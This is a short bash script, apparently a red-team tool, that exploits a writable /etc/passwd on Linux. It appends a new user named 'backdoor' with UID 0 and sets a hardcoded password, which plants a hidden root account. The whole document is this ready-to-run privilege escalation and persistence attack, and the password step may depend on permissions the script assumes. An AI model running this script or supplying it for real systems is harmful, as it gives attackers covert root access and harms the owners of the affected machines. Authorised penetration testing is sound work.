#!/bin/bash

# Red Team - Exploit Writable /etc/passwd Privilege Escalation

NEW_USER="backdoor"
NEW_PASS="backdoorpass"

# Check if /etc/passwd is writable
if [ -w /etc/passwd ]; then
    echo "[+] /etc/passwd is writable. Adding a new root user..."

    # Create a new root user by appending to /etc/passwd
    echo "$NEW_USER:x:0:0::/root:/bin/bash" >> /etc/passwd

    # Set the password for the new user
    echo "$NEW_USER:$NEW_PASS" | chpasswd

    echo "[+] New root user $NEW_USER added with password $NEW_PASS."
else
    echo "[!] /etc/passwd is not writable. Exploit failed."
fi